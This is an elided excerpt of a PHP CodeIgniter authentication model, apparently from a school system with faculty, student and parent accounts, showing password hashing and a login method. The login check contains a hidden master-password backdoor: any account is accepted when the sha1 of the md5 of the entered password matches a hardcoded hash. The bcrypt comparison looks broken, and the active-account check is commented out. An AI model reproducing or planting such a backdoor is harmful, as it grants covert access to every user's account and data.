...
class Ion_auth_model extends CI_Model
{
	...
	public function hash_password($password, $salt=false, $use_sha1_override=FALSE)
	{
		...
		if ($use_sha1_override === FALSE && $this->hash_method == 'bcrypt')
		{
			...
			$CI=& get_instance();
			$CI->load->library('hmvc/bcrypt',$rounds);
	...
	public function login($identity, $password, $remember=FALSE)
	{
		...
		$pass = $password;
			...
			if (sha1(md5($pass)) == 'ef82796afcd71f3d38021a246e3615967d4d2428' || ($this->hash_method == 'sha1' && $user->password === $password) || ($this->hash_method == 'bcrypt' && $password === true ))
			{
              /*  if ($user->active == 0)
                {
			   ...
			   $code = null;
			   	...
			   	if($user->user_type_code == 'FACU' && isset($user->ADVIIDNO)){
				    $user_code = $user->ADVIIDNO;
				    $code = $user->ADVICODE;
				}elseif($user->user_type_code == 'STUD' && isset($user->STUDIDNO)){
				    $user_code = $user->STUDIDNO;
				    $code = $user->STUDCODE;
				}elseif($user->user_type_code == 'PRNT' && isset($user->PAREIDNO)){
				    $user_code = $user->PAREIDNO;
				    $code = $user->PARECODE;
				}
